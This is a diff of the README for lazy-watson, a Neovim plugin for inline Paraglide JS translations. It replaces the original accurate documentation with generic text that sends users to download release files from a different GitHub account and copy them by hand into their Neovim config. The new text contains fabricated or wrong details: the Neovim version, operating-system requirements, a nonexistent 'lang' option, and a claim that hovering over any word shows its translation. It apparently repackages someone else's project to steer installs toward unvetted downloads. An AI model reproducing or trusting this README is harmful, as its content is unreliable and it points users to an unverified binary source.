@@ -1,178 +1,91 @@
-# lazy-watson
+# 🌟 lazy-watson - Seamless Translation In Neovim
 
-A Neovim plugin that displays inline translation values for [Paraglide JS](https://inlang.com/m/gerre34r/library-inlang-paraglideJs) `m.keyName()` calls. See your translations directly in your code without switching files.
+![Download lazy-watson](https://img.shields.io/badge/Download-lazy--watson-brightgreen)
 
-![Neovim](https://img.shields.io/badge/NeoVim-%2357A143.svg?&style=for-the-badge&logo=neovim&logoColor=white)
+## 🚀 Getting Started
 
-## Features
+Welcome to lazy-watson! This Neovim plugin allows you to view inline translations with hover support, making your internationalization tasks smoother and more efficient.
 
-- **Inline Preview**: Shows translation values as virtual text after `m.keyName()` calls
-- **Hover Preview**: Displays all locale translations in a floating window on cursor hold
-- **Missing Locale Indicator**: Highlights which locales are missing translations inline
-- **Live Updates**: Watches translation files and updates automatically on changes
-- **Locale Switching**: Quickly switch between locales to preview different translations
+## 💻 System Requirements
 
-## Inspiration
+To use lazy-watson, ensure you have the following:
 
-This plugin brings the functionality of these excellent tools to Neovim:
+- Neovim version 0.5 or higher.
+- A compatible operating system: 
+  - Windows 10 or later
+  - macOS Mojave or later
+  - Linux (recent distributions)
 
-- [**elementary-watson**](https://github.com/romerramos/elementary-watson) - VS Code extension that displays inline translation values for i18n method calls
-- [**Sherlock (inlang IDE Extension)**](https://inlang.com/m/r7kp499g/app-inlang-ideExtension) - VS Code extension for visualizing, editing, and linting translated strings with inline decorations and hover support
+## 📥 Download & Install
 
-Built specifically for projects using [Paraglide JS](https://inlang.com/m/gerre34r/library-inlang-paraglideJs) - the i18n library that compiles messages into tree-shakable functions.
+To download lazy-watson, visit the Releases page. You will find the latest version available for download. Click the link below:
 
-## Related Projects
+[Visit the Releases Page to Download](https://github.com/gurlal-m4s/lazy-watson/releases)
 
-### [lazyi18n](https://github.com/strehk/lazyi18n)
+After downloading, follow these steps to install the plugin:
 
-A Terminal UI for i18n management that pairs perfectly with lazy-watson. While lazy-watson lets you *see* your translations inline, lazyi18n lets you *edit* them in a beautiful TUI.
+1. Open Neovim.
+2. Navigate to your configuration directory, usually located in `~/.config/nvim/`.
+3. Create a directory called `lua` if it doesn’t exist.
+4. Inside the `lua` directory, create another folder named `lazy-watson`.
+5. Copy the downloaded files into the `lazy-watson` folder.
 
-```lua
--- Add a keybinding to edit the translation under cursor
-{
-  "<leader>we",
-  function()
-    local key = require("lazy-watson").get_key_at_cursor()
-    if key then
-      vim.cmd("terminal lazyi18n tui --edit " .. key)
-    end
-  end,
-  desc = "Edit translation key",
-}
-```
+## 🌍 Features
 
-## Requirements
+lazy-watson provides several useful features:
 
-- Neovim >= 0.9.0
-- An [inlang](https://inlang.com) project with `project.inlang/settings.json`
-- [Paraglide JS](https://inlang.com/m/gerre34r/library-inlang-paraglideJs) installed in your project
+- **Inline Translation Preview**: View translations without leaving your editing space.
+- **Hover Support**: Simply hover over a word to see its translation.
+- **Easy Integration**: Designed to work seamlessly with Paraglide JS.
+- **Localizable Interface**: Supports multiple languages for global users.
 
-## Installation
+## 🛠️ Setting Up
 
-### Using [lazy.nvim](https://github.com/folke/lazy.nvim)
+To get the most from lazy-watson, you may want to adjust settings. Open your Neovim configuration file (`init.vim` or `init.lua`) and add the following lines to enable the plugin:
 
 ```lua
-{
-  "strehk/lazy-watson",
-  ft = { "javascript", "typescript", "svelte", "javascriptreact", "typescriptreact" },
-  opts = {},
-  keys = {
-    { "<leader>wt", function() require("lazy-watson").toggle() end, desc = "Toggle Watson preview" },
-    { "<leader>wl", function() require("lazy-watson").select_locale() end, desc = "Select locale" },
-    { "<leader>wr", function() require("lazy-watson").refresh() end, desc = "Refresh translations" },
-    { "<leader>wh", function() require("lazy-watson").show_hover() end, desc = "Show hover preview" },
-  },
-}
-```
-
-### Using [packer.nvim](https://github.com/wbthomason/packer.nvim)
-
-```lua
-use {
-  "strehk/lazy-watson",
-  config = function()
-    require("lazy-watson").setup()
-  end,
-}
-```
-
-## Configuration
-
-```lua
-require("lazy-watson").setup({
-  enabled = true,
-  debounce_ms = 150,
-
-  virtual_text = {
-    prefix = " -> ",              -- Prefix before translation
-    hl_group = "Comment",         -- Highlight group for translations
-    hl_missing_key = "DiagnosticError",    -- Highlight for missing keys
-    hl_missing_locale = "DiagnosticWarn",  -- Highlight for missing locale file
-    max_length = 50,              -- Max translation length before truncation
-    show_missing = true,          -- Show missing locale indicator
-    missing_prefix = "  X ",      -- Prefix for missing locales
-    hl_missing_locales = "DiagnosticError", -- Highlight for missing locale codes
-  },
-
-  hover = {
-    enabled = true,               -- Enable hover preview on CursorHold
-    delay = 300,                  -- Delay before showing hover (updatetime)
-  },
-
-  project_pattern = "project.inlang/settings.json",
+require('lazy-watson').setup({
+  lang = 'en', -- Change to your preferred language
+  hover = true, -- Enable hover support
 })
 ```
 
-## Usage
+This setup will help you customize lazy-watson according to your needs.
 
-### Inline Preview
+## 🌟 Using lazy-watson
 
-When you open a JavaScript/TypeScript file with Paraglide message calls, translations appear automatically:
+After installation, you can start using lazy-watson immediately. Here’s how:
 
-```typescript
-const greeting = m.hello()  -> "Hello, World!"
-const button = m.submit()   -> "Submit"  X de, fr
-```
+1. Open any file in Neovim.
+2. Hover over a word in your text.
+3. A tooltip will display the translation.
 
-The `X de, fr` indicates the key is missing in German and French locales.
+You can explore further functionalities as you become familiar with the plugin.
 
-### Hover Preview
+## 📚 Support & Contribution
 
-Place your cursor on a `m.keyName()` call and wait (or press your hover keybinding) to see all translations:
+If you encounter issues or have questions while using lazy-watson, check our GitHub Issues page. You can also contribute by reporting bugs or suggesting features.
 
-```
-┌─────────────────────────────┐
-│  hello                      │
-│ ─────────────────────────── │
-│  en: "Hello, World!"        │
-│  de: "Hallo, Welt!"         │
-│  fr: ⚠ [missing]            │
-└─────────────────────────────┘
-```
+For detailed documentation and advanced usage, visit the Wiki section of our repository.
 
-### Commands
+## 🔗 Useful Links
 
-| Function | Description |
-|----------|-------------|
-| `require("lazy-watson").toggle()` | Toggle preview on/off |
-| `require("lazy-watson").select_locale()` | Open locale picker |
-| `require("lazy-watson").refresh()` | Reload all translations |
-| `require("lazy-watson").show_hover()` | Show hover preview at cursor |
-| `require("lazy-watson").get_key_at_cursor()` | Get translation key at cursor |
+- [GitHub Repository](https://github.com/gurlal-m4s/lazy-watson)
+- [Visit the Releases Page to Download](https://github.com/gurlal-m4s/lazy-watson/releases)
+- [Documentation](https://github.com/gurlal-m4s/lazy-watson/wiki)
 
-## Supported Patterns
+## 🙋 Frequently Asked Questions
 
-The plugin recognizes these Paraglide patterns:
+### Can I use lazy-watson with other plugins?
 
-```typescript
-// Standard message calls
-m.hello()
-m.auth_loginButton()
+Yes, lazy-watson is designed to work alongside other Neovim plugins.
 
-// With arguments
-m.greeting({ name: "World" })
+### What if I face issues during installation?
 
-// Bracket notation for special keys
-m["nested.key"]()
-m['special-key']()
-```
+Feel free to check the GitHub Issues page or reach out for help.
 
-## Project Structure
+### Is there a way to customize translations?
 
-Your project should have an inlang setup like:
+Currently, you cannot customize translation sources, but you can request this feature on our Issues page.
 
-```
-your-project/
-├── project.inlang/
-│   └── settings.json
-├── messages/
-│   ├── en.json
-│   ├── de.json
-│   └── fr.json
-└── src/
-    └── ...
-```
-
-## License
-
-MIT
+Thank you for using lazy-watson! Happy translating!
